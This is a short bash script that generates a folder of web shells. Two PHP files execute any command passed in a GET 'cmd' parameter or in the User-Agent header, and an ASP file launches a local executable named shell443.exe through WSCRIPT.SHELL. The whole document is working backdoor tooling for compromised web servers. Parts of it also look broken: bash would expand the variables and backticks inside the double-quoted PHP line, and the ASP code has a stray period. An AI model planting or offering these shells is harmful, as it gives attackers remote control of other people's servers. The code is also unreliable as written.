#!/usr/bin/bash

mkdir webshells
cd webshells

rm shell_get_cmd.php
echo "<?php $output = `$_GET['cmd']`; echo \"<pre>$output</pre>\"; ?>" > shell_get_cmd.php
rm shell_useragent.php
echo "<?php system($_SERVER['HTTP_USER_AGENT'])?>" > shell_useragent.php

rm shell.asp
echo "<%" >> shell.asp
echo "Dim oS." >> shell.asp
echo "On Error Resume Next" >> shell.asp
echo "Set oS = Server.CreateObject(\"WSCRIPT.SHELL\")" >> shell.asp
echo "Call oS.Run(\"win.com cmd.exe /c c:\Inetpub\shell443.exe\",0,True)" >> shell.asp
echo "%>" >> shell.asp
